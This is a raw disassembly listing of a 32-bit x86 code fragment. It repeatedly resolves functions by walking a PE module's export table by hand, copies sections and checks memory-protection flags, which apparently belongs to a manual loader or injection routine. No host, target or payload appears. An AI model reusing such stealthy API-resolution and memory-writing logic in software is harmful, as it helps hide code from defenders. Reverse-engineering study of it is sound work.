  40348e:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 nopw %cs:0x0(%eax,%eax,1)
  403495:	1f 84 00 00 00 00 00 
  40349c:	89 55 ec             	mov    %edx,-0x14(%ebp)
  40349f:	8b 4e f8             	mov    -0x8(%esi),%ecx
  4034a2:	8b 56 fc             	mov    -0x4(%esi),%edx
  4034a5:	03 4d d8             	add    -0x28(%ebp),%ecx
  4034a8:	89 75 f0             	mov    %esi,-0x10(%ebp)
  4034ab:	8b 36                	mov    (%esi),%esi
  4034ad:	03 75 08             	add    0x8(%ebp),%esi
  4034b0:	c7 45 90 09 00 00 00 	movl   $0x9,-0x70(%ebp)
  4034b7:	83 ec 0c             	sub    $0xc,%esp
  4034ba:	6a 00                	push   $0x0
  4034bc:	52                   	push   %edx
  4034bd:	56                   	push   %esi
  4034be:	51                   	push   %ecx
  4034bf:	50                   	push   %eax
  4034c0:	e8 5b 03 00 00       	call   0x403820
  4034c5:	83 c4 20             	add    $0x20,%esp
  4034c8:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4034cb:	42                   	inc    %edx
  4034cc:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4034cf:	0f b7 48 06          	movzwl 0x6(%eax),%ecx
  4034d3:	8b 45 c0             	mov    -0x40(%ebp),%eax
  4034d6:	8b 75 f0             	mov    -0x10(%ebp),%esi
  4034d9:	83 c6 28             	add    $0x28,%esi
  4034dc:	39 ca                	cmp    %ecx,%edx
  4034de:	72 bc                	jb     0x40349c
  4034e0:	8b 8d 00 fd ff ff    	mov    -0x300(%ebp),%ecx
  4034e6:	83 c1 08             	add    $0x8,%ecx
  4034e9:	c7 45 90 08 00 00 00 	movl   $0x8,-0x70(%ebp)
  4034f0:	83 ec 0c             	sub    $0xc,%esp
  4034f3:	8d 55 d8             	lea    -0x28(%ebp),%edx
  4034f6:	6a 00                	push   $0x0
  4034f8:	6a 04                	push   $0x4
  4034fa:	52                   	push   %edx
  4034fb:	51                   	push   %ecx
  4034fc:	50                   	push   %eax
  4034fd:	e8 1e 03 00 00       	call   0x403820
  403502:	83 c4 20             	add    $0x20,%esp
  403505:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403508:	8b 40 28             	mov    0x28(%eax),%eax
  40350b:	03 45 d8             	add    -0x28(%ebp),%eax
  40350e:	89 85 0c fd ff ff    	mov    %eax,-0x2f4(%ebp)
  403514:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  403517:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40351a:	a1 70 ee 4a 00       	mov    0x4aee70,%eax
  40351f:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403522:	c7 45 90 0a 00 00 00 	movl   $0xa,-0x70(%ebp)
  403529:	e8 ce f1 ff ff       	call   0x4026fc
  40352e:	8b 55 f0             	mov    -0x10(%ebp),%edx
  403531:	8b 4a 3c             	mov    0x3c(%edx),%ecx
  403534:	8b 74 0a 78          	mov    0x78(%edx,%ecx,1),%esi
  403538:	3d ff ff 00 00       	cmp    $0xffff,%eax
  40353d:	77 12                	ja     0x403551
  40353f:	8b 7c 32 1c          	mov    0x1c(%edx,%esi,1),%edi
  403543:	01 d7                	add    %edx,%edi
  403545:	0f b7 c8             	movzwl %ax,%ecx
  403548:	2b 4c 32 10          	sub    0x10(%edx,%esi,1),%ecx
  40354c:	8d 04 8f             	lea    (%edi,%ecx,4),%eax
  40354f:	eb 79                	jmp    0x4035ca
  403551:	8b 5c 32 18          	mov    0x18(%edx,%esi,1),%ebx
  403555:	89 75 e8             	mov    %esi,-0x18(%ebp)
  403558:	8b 4c 32 20          	mov    0x20(%edx,%esi,1),%ecx
  40355c:	01 d1                	add    %edx,%ecx
  40355e:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  403561:	31 c9                	xor    %ecx,%ecx
  403563:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  40356a:	00 00 
  40356c:	4b                   	dec    %ebx
  40356d:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  403570:	eb 11                	jmp    0x403583
  403572:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  403579:	00 00 00 
  40357c:	43                   	inc    %ebx
  40357d:	89 d9                	mov    %ebx,%ecx
  40357f:	89 fa                	mov    %edi,%edx
  403581:	89 f0                	mov    %esi,%eax
  403583:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  403586:	8b 75 f0             	mov    -0x10(%ebp),%esi
  403589:	8d 1c 0e             	lea    (%esi,%ecx,1),%ebx
  40358c:	d1 eb                	shr    $1,%ebx
  40358e:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  403591:	8b 0c 99             	mov    (%ecx,%ebx,4),%ecx
  403594:	89 d7                	mov    %edx,%edi
  403596:	01 d1                	add    %edx,%ecx
  403598:	83 ec 08             	sub    $0x8,%esp
  40359b:	89 c6                	mov    %eax,%esi
  40359d:	50                   	push   %eax
  40359e:	51                   	push   %ecx
  40359f:	e8 0c ed 00 00       	call   0x4122b0
  4035a4:	83 c4 10             	add    $0x10,%esp
  4035a7:	85 c0                	test   %eax,%eax
  4035a9:	78 d1                	js     0x40357c
  4035ab:	89 fa                	mov    %edi,%edx
  4035ad:	89 f0                	mov    %esi,%eax
  4035af:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4035b2:	75 b8                	jne    0x40356c
  4035b4:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4035b7:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  4035bb:	01 d0                	add    %edx,%eax
  4035bd:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  4035c1:	01 d1                	add    %edx,%ecx
  4035c3:	0f b7 04 58          	movzwl (%eax,%ebx,2),%eax
  4035c7:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  4035ca:	03 10                	add    (%eax),%edx
  4035cc:	c7 45 90 0b 00 00 00 	movl   $0xb,-0x70(%ebp)
  4035d3:	83 ec 08             	sub    $0x8,%esp
  4035d6:	8d 85 5c fc ff ff    	lea    -0x3a4(%ebp),%eax
  4035dc:	50                   	push   %eax
  4035dd:	ff 75 e4             	push   -0x1c(%ebp)
  4035e0:	ff d2                	call   *%edx
  4035e2:	83 c4 08             	add    $0x8,%esp
  4035e5:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  4035e8:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4035eb:	a1 70 ee 4a 00       	mov    0x4aee70,%eax
  4035f0:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4035f3:	c7 45 90 0c 00 00 00 	movl   $0xc,-0x70(%ebp)
  4035fa:	e8 5d f3 ff ff       	call   0x40295c
  4035ff:	8b 55 f0             	mov    -0x10(%ebp),%edx
  403602:	8b 4a 3c             	mov    0x3c(%edx),%ecx
  403605:	8b 74 0a 78          	mov    0x78(%edx,%ecx,1),%esi
  403609:	3d ff ff 00 00       	cmp    $0xffff,%eax
  40360e:	77 12                	ja     0x403622
  403610:	8b 7c 32 1c          	mov    0x1c(%edx,%esi,1),%edi
  403614:	01 d7                	add    %edx,%edi
  403616:	0f b7 c8             	movzwl %ax,%ecx
  403619:	2b 4c 32 10          	sub    0x10(%edx,%esi,1),%ecx
  40361d:	8d 04 8f             	lea    (%edi,%ecx,4),%eax
  403620:	eb 78                	jmp    0x40369a
  403622:	8b 5c 32 18          	mov    0x18(%edx,%esi,1),%ebx
  403626:	89 75 e8             	mov    %esi,-0x18(%ebp)
  403629:	8b 4c 32 20          	mov    0x20(%edx,%esi,1),%ecx
  40362d:	01 d1                	add    %edx,%ecx
  40362f:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  403632:	31 c9                	xor    %ecx,%ecx
  403634:	0f 1f 84 00 00 00 00 	nopl   0x0(%eax,%eax,1)
  40363b:	00 
  40363c:	4b                   	dec    %ebx
  40363d:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  403640:	eb 11                	jmp    0x403653
  403642:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  403649:	00 00 00 
  40364c:	43                   	inc    %ebx
  40364d:	89 d9                	mov    %ebx,%ecx
  40364f:	89 fa                	mov    %edi,%edx
  403651:	89 f0                	mov    %esi,%eax
  403653:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  403656:	8b 75 f0             	mov    -0x10(%ebp),%esi
  403659:	8d 1c 0e             	lea    (%esi,%ecx,1),%ebx
  40365c:	d1 eb                	shr    $1,%ebx
  40365e:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  403661:	8b 0c 99             	mov    (%ecx,%ebx,4),%ecx
  403664:	89 d7                	mov    %edx,%edi
  403666:	01 d1                	add    %edx,%ecx
  403668:	83 ec 08             	sub    $0x8,%esp
  40366b:	89 c6                	mov    %eax,%esi
  40366d:	50                   	push   %eax
  40366e:	51                   	push   %ecx
  40366f:	e8 3c ec 00 00       	call   0x4122b0
  403674:	83 c4 10             	add    $0x10,%esp
  403677:	85 c0                	test   %eax,%eax
  403679:	78 d1                	js     0x40364c
  40367b:	89 fa                	mov    %edi,%edx
  40367d:	89 f0                	mov    %esi,%eax
  40367f:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  403682:	75 b8                	jne    0x40363c
  403684:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  403687:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  40368b:	01 d0                	add    %edx,%eax
  40368d:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  403691:	01 d1                	add    %edx,%ecx
  403693:	0f b7 04 58          	movzwl (%eax,%ebx,2),%eax
  403697:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  40369a:	03 10                	add    (%eax),%edx
  40369c:	c7 45 90 0d 00 00 00 	movl   $0xd,-0x70(%ebp)
  4036a3:	83 ec 08             	sub    $0x8,%esp
  4036a6:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4036a9:	50                   	push   %eax
  4036aa:	ff 75 e4             	push   -0x1c(%ebp)
  4036ad:	ff d2                	call   *%edx
  4036af:	83 c4 08             	add    $0x8,%esp
  4036b2:	31 c0                	xor    %eax,%eax
  4036b4:	e9 b2 00 00 00       	jmp    0x40376b
  4036b9:	8b 45 8c             	mov    -0x74(%ebp),%eax
  4036bc:	3d 11 00 00 00       	cmp    $0x11,%eax
  4036c1:	0f 87 96 00 00 00    	ja     0x40375d
  4036c7:	2d 01 00 00 00       	sub    $0x1,%eax
  4036cc:	ff 24 85 dc 37 40 00 	jmp    *0x4037dc(,%eax,4)
  4036d3:	eb 25                	jmp    0x4036fa
  4036d5:	eb 23                	jmp    0x4036fa
  4036d7:	8b 45 98             	mov    -0x68(%ebp),%eax
  4036da:	83 ec 0c             	sub    $0xc,%esp
  4036dd:	ff 75 94             	push   -0x6c(%ebp)
  4036e0:	e8 83 cd 01 00       	call   0x420468
  4036e5:	83 c4 10             	add    $0x10,%esp
  4036e8:	c7 45 90 06 00 00 00 	movl   $0x6,-0x70(%ebp)
  4036ef:	e8 e0 cd 01 00       	call   0x4204d4
  4036f4:	eb 69                	jmp    0x40375f
  4036f6:	eb 02                	jmp    0x4036fa
  4036f8:	eb 00                	jmp    0x4036fa
  4036fa:	8b 45 94             	mov    -0x6c(%ebp),%eax
  4036fd:	8b 4d 98             	mov    -0x68(%ebp),%ecx
  403700:	89 8d 6c ff ff ff    	mov    %ecx,-0x94(%ebp)
  403706:	89 85 70 ff ff ff    	mov    %eax,-0x90(%ebp)
  40370c:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  403710:	74 16                	je     0x403728
  403712:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403715:	c7 45 90 10 00 00 00 	movl   $0x10,-0x70(%ebp)
  40371c:	83 ec 0c             	sub    $0xc,%esp
  40371f:	50                   	push   %eax
  403720:	e8 d5 e9 01 00       	call   0x4220fa
  403725:	83 c4 0c             	add    $0xc,%esp
  403728:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
  40372c:	74 16                	je     0x403744
  40372e:	8b 45 d0             	mov    -0x30(%ebp),%eax
  403731:	c7 45 90 11 00 00 00 	movl   $0x11,-0x70(%ebp)
  403738:	83 ec 0c             	sub    $0xc,%esp
  40373b:	50                   	push   %eax
  40373c:	e8 b9 e9 01 00       	call   0x4220fa
  403741:	83 c4 0c             	add    $0xc,%esp
  403744:	8b 85 70 ff ff ff    	mov    -0x90(%ebp),%eax
  40374a:	c7 45 90 ff ff ff ff 	movl   $0xffffffff,-0x70(%ebp)
  403751:	83 ec 0c             	sub    $0xc,%esp
  403754:	50                   	push   %eax
  403755:	e8 46 e8 01 00       	call   0x421fa0
  40375a:	83 c4 0c             	add    $0xc,%esp
  40375d:	0f 0b                	ud2
  40375f:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%ebp)
  403766:	b8 01 00 00 00       	mov    $0x1,%eax
  40376b:	89 45 80             	mov    %eax,-0x80(%ebp)
  40376e:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  403772:	74 16                	je     0x40378a
  403774:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403777:	c7 45 90 0e 00 00 00 	movl   $0xe,-0x70(%ebp)
  40377e:	83 ec 0c             	sub    $0xc,%esp
  403781:	50                   	push   %eax
  403782:	e8 73 e9 01 00       	call   0x4220fa
  403787:	83 c4 0c             	add    $0xc,%esp
  40378a:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
  40378e:	8b 7d 80             	mov    -0x80(%ebp),%edi
  403791:	0f 84 aa fa ff ff    	je     0x403241
  403797:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40379a:	8b 4d 80             	mov    -0x80(%ebp),%ecx
  40379d:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4037a0:	c7 45 90 0f 00 00 00 	movl   $0xf,-0x70(%ebp)
  4037a7:	83 ec 0c             	sub    $0xc,%esp
  4037aa:	50                   	push   %eax
  4037ab:	e8 4a e9 01 00       	call   0x4220fa
  4037b0:	8b 7d f0             	mov    -0x10(%ebp),%edi
  4037b3:	83 c4 0c             	add    $0xc,%esp
  4037b6:	e9 86 fa ff ff       	jmp    0x403241
  4037bb:	8b 45 98             	mov    -0x68(%ebp),%eax
  4037be:	eb 0d                	jmp    0x4037cd
  4037c0:	8b 45 98             	mov    -0x68(%ebp),%eax
  4037c3:	eb 08                	jmp    0x4037cd
  4037c5:	8b 45 98             	mov    -0x68(%ebp),%eax
  4037c8:	eb 03                	jmp    0x4037cd
  4037ca:	8b 45 98             	mov    -0x68(%ebp),%eax
  4037cd:	83 ec 0c             	sub    $0xc,%esp
  4037d0:	ff 75 94             	push   -0x6c(%ebp)
  4037d3:	e8 b0 0e 00 00       	call   0x404688
  4037d8:	83 c4 0c             	add    $0xc,%esp
  4037db:	90                   	nop
  4037dc:	d3 36                	shll   %cl,(%esi)
  4037de:	40                   	inc    %eax
  4037df:	00 d3                	add    %dl,%bl
  4037e1:	36 40                	ss inc %eax
  4037e3:	00 d5                	add    %dl,%ch
  4037e5:	36 40                	ss inc %eax
  4037e7:	00 d5                	add    %dl,%ch
  4037e9:	36 40                	ss inc %eax
  4037eb:	00 d7                	add    %dl,%bh
  4037ed:	36 40                	ss inc %eax
  4037ef:	00 f6                	add    %dh,%dh
  4037f1:	36 40                	ss inc %eax
  4037f3:	00 f6                	add    %dh,%dh
  4037f5:	36 40                	ss inc %eax
  4037f7:	00 f8                	add    %bh,%al
  4037f9:	36 40                	ss inc %eax
  4037fb:	00 fa                	add    %bh,%dl
  4037fd:	36 40                	ss inc %eax
  4037ff:	00 f8                	add    %bh,%al
  403801:	36 40                	ss inc %eax
  403803:	00 f8                	add    %bh,%al
  403805:	36 40                	ss inc %eax
  403807:	00 f8                	add    %bh,%al
  403809:	36 40                	ss inc %eax
  40380b:	00 f8                	add    %bh,%al
  40380d:	36 40                	ss inc %eax
  40380f:	00 bb 37 40 00 c0    	add    %bh,-0x3fffbfc9(%ebx)
  403815:	37                   	aaa
  403816:	40                   	inc    %eax
  403817:	00 c5                	add    %al,%ch
  403819:	37                   	aaa
  40381a:	40                   	inc    %eax
  40381b:	00 ca                	add    %cl,%dl
  40381d:	37                   	aaa
  40381e:	40                   	inc    %eax
  40381f:	00 55 53             	add    %dl,0x53(%ebp)
  403822:	57                   	push   %edi
  403823:	56                   	push   %esi
  403824:	83 ec 2c             	sub    $0x2c,%esp
  403827:	8b 4c 24 4c          	mov    0x4c(%esp),%ecx
  40382b:	8b 44 24 44          	mov    0x44(%esp),%eax
  40382f:	8b 74 24 40          	mov    0x40(%esp),%esi
  403833:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  403837:	89 44 24 14          	mov    %eax,0x14(%esp)
  40383b:	8b 3d 70 ee 4a 00    	mov    0x4aee70,%edi
  403841:	e8 26 eb ff ff       	call   0x40236c
  403846:	89 fa                	mov    %edi,%edx
  403848:	8b 4a 3c             	mov    0x3c(%edx),%ecx
  40384b:	8b 7c 0a 78          	mov    0x78(%edx,%ecx,1),%edi
  40384f:	3d ff ff 00 00       	cmp    $0xffff,%eax
  403854:	77 12                	ja     0x403868
  403856:	8b 5c 3a 1c          	mov    0x1c(%edx,%edi,1),%ebx
  40385a:	01 d3                	add    %edx,%ebx
  40385c:	0f b7 c8             	movzwl %ax,%ecx
  40385f:	2b 4c 3a 10          	sub    0x10(%edx,%edi,1),%ecx
  403863:	8d 04 8b             	lea    (%ebx,%ecx,4),%eax
  403866:	eb 77                	jmp    0x4038df
  403868:	8b 6c 3a 18          	mov    0x18(%edx,%edi,1),%ebp
  40386c:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  403870:	8b 4c 3a 20          	mov    0x20(%edx,%edi,1),%ecx
  403874:	01 d1                	add    %edx,%ecx
  403876:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  40387a:	31 ff                	xor    %edi,%edi
  40387c:	0f 1f 40 00          	nopl   0x0(%eax)
  403880:	4d                   	dec    %ebp
  403881:	89 6c 24 08          	mov    %ebp,0x8(%esp)
  403885:	eb 10                	jmp    0x403897
  403887:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  40388e:	00 00 
  403890:	45                   	inc    %ebp
  403891:	89 ef                	mov    %ebp,%edi
  403893:	89 da                	mov    %ebx,%edx
  403895:	89 f0                	mov    %esi,%eax
  403897:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  40389b:	8d 2c 39             	lea    (%ecx,%edi,1),%ebp
  40389e:	d1 ed                	shr    $1,%ebp
  4038a0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4038a4:	8b 0c a9             	mov    (%ecx,%ebp,4),%ecx
  4038a7:	89 d3                	mov    %edx,%ebx
  4038a9:	01 d1                	add    %edx,%ecx
  4038ab:	83 ec 08             	sub    $0x8,%esp
  4038ae:	89 c6                	mov    %eax,%esi
  4038b0:	50                   	push   %eax
  4038b1:	51                   	push   %ecx
  4038b2:	e8 f9 e9 00 00       	call   0x4122b0
  4038b7:	83 c4 10             	add    $0x10,%esp
  4038ba:	85 c0                	test   %eax,%eax
  4038bc:	78 d2                	js     0x403890
  4038be:	89 da                	mov    %ebx,%edx
  4038c0:	89 f0                	mov    %esi,%eax
  4038c2:	75 bc                	jne    0x403880
  4038c4:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4038c8:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  4038cc:	01 d0                	add    %edx,%eax
  4038ce:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  4038d2:	01 d1                	add    %edx,%ecx
  4038d4:	0f b7 04 68          	movzwl (%eax,%ebp,2),%eax
  4038d8:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  4038db:	8b 74 24 40          	mov    0x40(%esp),%esi
  4038df:	89 f7                	mov    %esi,%edi
  4038e1:	03 10                	add    (%eax),%edx
  4038e3:	83 ec 0c             	sub    $0xc,%esp
  4038e6:	8d 6c 24 24          	lea    0x24(%esp),%ebp
  4038ea:	8d 5c 24 28          	lea    0x28(%esp),%ebx
  4038ee:	8d 74 24 20          	lea    0x20(%esp),%esi
  4038f2:	55                   	push   %ebp
  4038f3:	6a 04                	push   $0x4
  4038f5:	53                   	push   %ebx
  4038f6:	56                   	push   %esi
  4038f7:	57                   	push   %edi
  4038f8:	ff d2                	call   *%edx
  4038fa:	83 c4 0c             	add    $0xc,%esp
  4038fd:	85 c0                	test   %eax,%eax
  4038ff:	0f 88 3c 02 00 00    	js     0x403b41
  403905:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  403909:	f6 c1 4c             	test   $0x4c,%cl
  40390c:	75 59                	jne    0x403967
  40390e:	84 c9                	test   %cl,%cl
  403910:	78 55                	js     0x403967
  403912:	f6 c1 03             	test   $0x3,%cl
  403915:	a1 70 ee 4a 00       	mov    0x4aee70,%eax
  40391a:	89 44 24 08          	mov    %eax,0x8(%esp)
  40391e:	0f 84 24 02 00 00    	je     0x403b48
  403924:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  403928:	e8 3f ea ff ff       	call   0x40236c
  40392d:	8b 54 24 08          	mov    0x8(%esp),%edx
  403931:	89 c7                	mov    %eax,%edi
  403933:	8b 42 3c             	mov    0x3c(%edx),%eax
  403936:	8b 4c 02 78          	mov    0x78(%edx,%eax,1),%ecx
  40393a:	81 ff ff ff 00 00    	cmp    $0xffff,%edi
  403940:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  403944:	0f 87 3f 02 00 00    	ja     0x403b89
  40394a:	8b 44 0a 1c          	mov    0x1c(%edx,%ecx,1),%eax
  40394e:	01 d0                	add    %edx,%eax
  403950:	0f b7 cf             	movzwl %di,%ecx
  403953:	8b 7c 24 10          	mov    0x10(%esp),%edi
  403957:	2b 4c 3a 10          	sub    0x10(%edx,%edi,1),%ecx
  40395b:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  40395e:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  403962:	e9 9f 02 00 00       	jmp    0x403c06
  403967:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  40396b:	8b 35 70 ee 4a 00    	mov    0x4aee70,%esi
  403971:	e8 f6 e9 ff ff       	call   0x40236c
  403976:	89 f2                	mov    %esi,%edx
  403978:	8b 4a 3c             	mov    0x3c(%edx),%ecx
  40397b:	8b 74 0a 78          	mov    0x78(%edx,%ecx,1),%esi
  40397f:	3d ff ff 00 00       	cmp    $0xffff,%eax
  403984:	77 1d                	ja     0x4039a3
  403986:	8b 7c 32 1c          	mov    0x1c(%edx,%esi,1),%edi
  40398a:	01 d7                	add    %edx,%edi
  40398c:	0f b7 c8             	movzwl %ax,%ecx
  40398f:	2b 4c 32 10          	sub    0x10(%edx,%esi,1),%ecx
  403993:	8d 04 8f             	lea    (%edi,%ecx,4),%eax
  403996:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  40399a:	8b 74 24 40          	mov    0x40(%esp),%esi
  40399e:	e9 8a 00 00 00       	jmp    0x403a2d
  4039a3:	8b 5c 32 18          	mov    0x18(%edx,%esi,1),%ebx
  4039a7:	89 74 24 10          	mov    %esi,0x10(%esp)
  4039ab:	8b 4c 32 20          	mov    0x20(%edx,%esi,1),%ecx
  4039af:	01 d1                	add    %edx,%ecx
  4039b1:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  4039b5:	31 ff                	xor    %edi,%edi
  4039b7:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  4039be:	00 00 
  4039c0:	4b                   	dec    %ebx
  4039c1:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  4039c5:	eb 10                	jmp    0x4039d7
  4039c7:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  4039ce:	00 00 
  4039d0:	43                   	inc    %ebx
  4039d1:	89 df                	mov    %ebx,%edi
  4039d3:	89 ea                	mov    %ebp,%edx
  4039d5:	89 f0                	mov    %esi,%eax
  4039d7:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4039db:	8d 1c 39             	lea    (%ecx,%edi,1),%ebx
  4039de:	d1 eb                	shr    $1,%ebx
  4039e0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4039e4:	8b 0c 99             	mov    (%ecx,%ebx,4),%ecx
  4039e7:	89 d5                	mov    %edx,%ebp
  4039e9:	01 d1                	add    %edx,%ecx
  4039eb:	83 ec 08             	sub    $0x8,%esp
  4039ee:	89 c6                	mov    %eax,%esi
  4039f0:	50                   	push   %eax
  4039f1:	51                   	push   %ecx
  4039f2:	e8 b9 e8 00 00       	call   0x4122b0
  4039f7:	83 c4 10             	add    $0x10,%esp
  4039fa:	85 c0                	test   %eax,%eax
  4039fc:	78 d2                	js     0x4039d0
  4039fe:	89 ea                	mov    %ebp,%edx
  403a00:	89 f0                	mov    %esi,%eax
  403a02:	75 bc                	jne    0x4039c0
  403a04:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  403a08:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  403a0c:	01 d0                	add    %edx,%eax
  403a0e:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  403a12:	01 d1                	add    %edx,%ecx
  403a14:	0f b7 04 58          	movzwl (%eax,%ebx,2),%eax
  403a18:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  403a1b:	8b 74 24 40          	mov    0x40(%esp),%esi
  403a1f:	8d 7c 24 14          	lea    0x14(%esp),%edi
  403a23:	89 f9                	mov    %edi,%ecx
  403a25:	8d 5c 24 1c          	lea    0x1c(%esp),%ebx
  403a29:	8d 6c 24 18          	lea    0x18(%esp),%ebp
  403a2d:	03 10                	add    (%eax),%edx
  403a2f:	83 ec 0c             	sub    $0xc,%esp
  403a32:	55                   	push   %ebp
  403a33:	ff 74 24 1c          	push   0x1c(%esp)
  403a37:	53                   	push   %ebx
  403a38:	51                   	push   %ecx
  403a39:	56                   	push   %esi
  403a3a:	ff d2                	call   *%edx
  403a3c:	83 c4 0c             	add    $0xc,%esp
  403a3f:	8b 3d 70 ee 4a 00    	mov    0x4aee70,%edi
  403a45:	e8 52 ea ff ff       	call   0x40249c
  403a4a:	89 fa                	mov    %edi,%edx
  403a4c:	8b 4a 3c             	mov    0x3c(%edx),%ecx
  403a4f:	8b 7c 0a 78          	mov    0x78(%edx,%ecx,1),%edi
  403a53:	3d ff ff 00 00       	cmp    $0xffff,%eax
  403a58:	77 12                	ja     0x403a6c
  403a5a:	8b 5c 3a 1c          	mov    0x1c(%edx,%edi,1),%ebx
  403a5e:	01 d3                	add    %edx,%ebx
  403a60:	0f b7 c8             	movzwl %ax,%ecx
  403a63:	2b 4c 3a 10          	sub    0x10(%edx,%edi,1),%ecx
  403a67:	8d 04 8b             	lea    (%ebx,%ecx,4),%eax
  403a6a:	eb 73                	jmp    0x403adf
  403a6c:	8b 6c 3a 18          	mov    0x18(%edx,%edi,1),%ebp
  403a70:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  403a74:	8b 4c 3a 20          	mov    0x20(%edx,%edi,1),%ecx
  403a78:	01 d1                	add    %edx,%ecx
  403a7a:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  403a7e:	31 ff                	xor    %edi,%edi
  403a80:	4d                   	dec    %ebp
  403a81:	89 6c 24 08          	mov    %ebp,0x8(%esp)
  403a85:	eb 10                	jmp    0x403a97
  403a87:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  403a8e:	00 00 
  403a90:	45                   	inc    %ebp
  403a91:	89 ef                	mov    %ebp,%edi
  403a93:	89 da                	mov    %ebx,%edx
  403a95:	89 f0                	mov    %esi,%eax
  403a97:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403a9b:	8d 2c 39             	lea    (%ecx,%edi,1),%ebp
  403a9e:	d1 ed                	shr    $1,%ebp
  403aa0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403aa4:	8b 0c a9             	mov    (%ecx,%ebp,4),%ecx
  403aa7:	89 d3                	mov    %edx,%ebx
  403aa9:	01 d1                	add    %edx,%ecx
  403aab:	83 ec 08             	sub    $0x8,%esp
  403aae:	89 c6                	mov    %eax,%esi
  403ab0:	50                   	push   %eax
  403ab1:	51                   	push   %ecx
  403ab2:	e8 f9 e7 00 00       	call   0x4122b0
  403ab7:	83 c4 10             	add    $0x10,%esp
  403aba:	85 c0                	test   %eax,%eax
  403abc:	78 d2                	js     0x403a90
  403abe:	89 da                	mov    %ebx,%edx
  403ac0:	89 f0                	mov    %esi,%eax
  403ac2:	75 bc                	jne    0x403a80
  403ac4:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403ac8:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  403acc:	01 d0                	add    %edx,%eax
  403ace:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  403ad2:	01 d1                	add    %edx,%ecx
  403ad4:	0f b7 04 68          	movzwl (%eax,%ebp,2),%eax
  403ad8:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  403adb:	8b 74 24 40          	mov    0x40(%esp),%esi
  403adf:	03 10                	add    (%eax),%edx
  403ae1:	83 ec 0c             	sub    $0xc,%esp
  403ae4:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  403ae8:	50                   	push   %eax
  403ae9:	ff 74 24 5c          	push   0x5c(%esp)
  403aed:	ff 74 24 5c          	push   0x5c(%esp)
  403af1:	ff 74 24 5c          	push   0x5c(%esp)
  403af5:	56                   	push   %esi
  403af6:	ff d2                	call   *%edx
  403af8:	83 c4 0c             	add    $0xc,%esp
  403afb:	8b 54 24 50          	mov    0x50(%esp),%edx
